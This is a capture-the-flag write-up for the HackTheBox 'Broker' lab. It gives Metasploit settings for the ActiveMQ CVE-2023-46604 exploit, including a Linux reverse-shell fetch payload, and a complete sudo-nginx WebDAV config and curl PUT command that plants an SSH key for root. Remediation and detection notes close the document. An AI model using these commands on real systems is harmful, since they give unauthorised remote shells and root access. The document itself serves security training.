# HackTheBox — Broker

> **OS:** Linux (Ubuntu)  ·  **Difficulty:** Easy  ·  **Date:** 2026-08-18

**Kill chain:** `ActiveMQ default creds → CVE-2023-46604 RCE → activemq shell → sudo nginx WebDAV PUT → root SSH key → root`

---

## Overview

Broker is two CVEs in a trench coat.

The first one gets you in: **CVE-2023-46604**, a critical unauthenticated RCE in Apache ActiveMQ that lets you make the broker fetch a remote Spring XML config and instantiate a `ProcessBuilder` bean — arbitrary command execution as the activemq user. The version running here (5.15.15) is confirmed vulnerable.

The second one gets you root: **`sudo nginx`** with no password. Nginx can run with an arbitrary config, and an arbitrary config can run as root and accept WebDAV `PUT` requests — meaning you can write any file anywhere on the filesystem as root. Drop your SSH pubkey into `/root/.ssh/authorized_keys`, SSH in, done.

Both are well-documented. The real skill here is adapting tooling that keeps failing: the Metasploit module needs a Linux target and a fetch payload (not the default Windows ones), and the public nginx exploit script has a relative-path bug that breaks its key-upload step. Reading the failure and fixing the one broken piece is faster than re-running a broken tool.

---

## Recon

```bash
nmap -sV -sC -p- 10.129.230.87
```

```
22/tcp    OpenSSH 8.9p1 (Ubuntu)
80/tcp    nginx 1.18.0  — 401 Unauthorized, realm "ActiveMQRealm"
1883/tcp  MQTT
5672/tcp  AMQP
8161/tcp  Jetty 9.4.39  — 401 Unauthorized, realm "ActiveMQRealm" (admin console)
61613/tcp STOMP — Apache ActiveMQ
61614/tcp Jetty 9.4.39
61616/tcp ActiveMQ OpenWire transport 5.15.15    ← exact version disclosed
```

Every service except SSH is ActiveMQ. The "ActiveMQRealm" basic-auth on port 80 and 8161 is the admin console.

---

## Foothold pt.1 — default credentials

Both 80 and 8161 ask for HTTP basic auth with realm `ActiveMQRealm`. ActiveMQ ships with `admin:admin` as the default.

```
admin:admin → full ActiveMQ admin console on port 8161
```

The admin UI confirms the exact version: **Apache ActiveMQ 5.15.15**.

---

## Foothold pt.2 — CVE-2023-46604 (ActiveMQ OpenWire RCE)

ActiveMQ ≤5.15.15 is vulnerable to CVE-2023-46604 via its OpenWire protocol listener on port 61616. The bug: a crafted `ExceptionResponse` packet can make the broker fetch a remote Spring XML `ClassPathXmlApplicationContext` file and instantiate beans from it. A `ProcessBuilder` bean executes arbitrary commands.

**Using the Metasploit module** — three config mistakes that waste a session if you don't catch them:

```
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS 10.129.230.87
set RPORT 61616
set target 1                                    # Linux/Unix — default is Windows
set payload cmd/linux/http/x64/shell_reverse_tcp  # fetch payload; linux/x64/* is rejected
set FETCH_COMMAND CURL                          # certutil is Windows-only
set LHOST <tun0>
set SRVPORT 8888                                # move off 8080 if in use
set FETCH_SRVPORT 8081
exploit
```

```
[+] Target appears to be vulnerable. Apache ActiveMQ 5.15.15
[*] Command shell session 1 opened
whoami
activemq
```

> **The failure mode to know:** "payload delivered, no session" almost always means target/payload OS mismatch. The module defaulted to a Windows target with a Windows meterpreter; the box is Linux. `show targets` and `show payloads` tell you what's compatible — match them to the actual OS.

---

## Privilege Escalation — sudo nginx → WebDAV PUT → root SSH key

```bash
sudo -l
```

```
(ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

activemq can run nginx as root, no password. nginx accepts a `-c` flag pointing to an arbitrary config. A config that sets `user root;` and enables WebDAV `PUT` on `root /;` means root writes any file you send it to any path on the filesystem.

**Write the config:**

```
user root;
worker_processes 1;
events { worker_connections 1024; }
http {
  server {
    listen 1339;
    root /;
    autoindex on;
    dav_methods PUT DELETE MKCOL COPY MOVE;
    create_full_put_path on;
    dav_access user:rw group:rw all:rw;
  }
}
```

Save as `/tmp/root.conf`.

**Start root-nginx:**

```bash
sudo /usr/sbin/nginx -c /tmp/root.conf
```

**Generate an SSH keypair** (on Kali — avoids interactive prompts in a dumb shell):

```bash
ssh-keygen -t rsa -f ./broker_key -N ""
```

**PUT the pubkey into root's authorized_keys through the root-owned nginx:**

```bash
curl -X PUT http://127.0.0.1:1339/root/.ssh/authorized_keys --data-binary @broker_key.pub
```

`--data-binary` preserves the newline; plain `-d` strips it and the key won't authenticate.

**SSH in as root:**

```bash
ssh -i broker_key -o StrictHostKeyChecking=no root@10.129.230.87
id
cat /root/root.txt
```

Root.

> **"bind() failed: address already in use" isn't nginx failing — it means it's already running.** If you see this error on a second start, the first instance is still live. Verify with `ss -tlnp | grep <port>` and skip the restart; just do the PUT against the already-running instance.

> **Public PoC script (DylanGrl/nginx_sudo_privesc)** has a relative-path bug in its key-display and PUT steps — it uses `.ssh/id_rsa` instead of `/home/activemq/.ssh/id_rsa` and runs from `/tmp`. The nginx config-generation and startup work fine; the key-upload step fails silently with an empty PUT. Fix: generate the keypair on Kali and do the curl PUT manually with the full path.

---

## Remediation

| Finding | Severity | Fix |
|---------|----------|-----|
| ActiveMQ default credentials (`admin:admin`) | High | Change admin credentials on install. Default creds on a network service are a first-stop for any attacker. |
| CVE-2023-46604 — unauthenticated OpenWire RCE | **Critical** | Upgrade ActiveMQ to ≥5.15.16 (patched). If upgrade isn't immediate, firewall port 61616 to trusted hosts only. |
| `activemq` user can run `nginx` as root (NOPASSWD) | **Critical** | Remove the sudo rule. nginx with an arbitrary config is equivalent to arbitrary root file read/write. |
| ActiveMQ admin UI exposed on port 8161 | Medium | Firewall 8161 to management networks only; never expose it to the internet. |

---

## Detection notes (blue-team view)

- **CVE-2023-46604 is detectable at the network layer.** The exploit sends a crafted OpenWire `ExceptionResponse` packet to port 61616 that triggers an outbound HTTP request from the broker to the attacker's server. An IDS rule on anomalous OpenWire framing or an outbound HTTP connection *from* the ActiveMQ process (which should never be initiating HTTP outbound) is high-signal. The Snort/Suricata SID for CVE-2023-46604 exists and is widely deployed.
- **The webshell-via-Spring-XML fetch is visible in ActiveMQ logs.** The broker logs the `ClassPathXmlApplicationContext` load — look for unexpected remote URL loads in ActiveMQ's own logs (`/opt/apache-activemq/data/activemq.log`).
- **The nginx sudo privesc has a host signal.** A non-privileged process running `sudo nginx -c /tmp/root.conf` (sudo on a web server binary, pointing to a temp-dir config) is anomalous. `auditd`/EDR watching `sudo` calls with unusual arguments, and `ss -tlnp` showing nginx on a non-standard port, both flag this. The real canary is `curl -X PUT ... /root/.ssh/authorized_keys` — any PUT request to localhost on a non-standard port from a shell process is worth an alert.
- **Root SSH login immediately after root file-write is the final pivot.** Correlate a new file in `/root/.ssh/` with a subsequent root SSH auth from an unusual source within seconds; that correlation is effectively the full attack chain in two log lines.

---

## Lessons

- **Exact version → searchsploit/CVE lookup, every time.** The nmap banner gave ActiveMQ 5.15.15 and that was the entire foothold path.
- **msf gotcha: match target and payload to the box OS.** "Payload delivered, no session" → `show targets`, set the right one, `show payloads`, pick a compatible one. Ten minutes saved every future box.
- **When a public PoC half-fails, read which line broke — not the whole technique.** The nginx script's concept was right; one relative-path bug broke the key-upload step. Fixed in three seconds with a full path and a manual curl.
- **"Address already in use" means it's already running.** Not broken — running. Verify with `ss -tlnp` before re-launching.
- **sudo on nginx (or any server binary that takes a config flag) = sudo on everything.** The config is the exploit surface, not the binary itself.
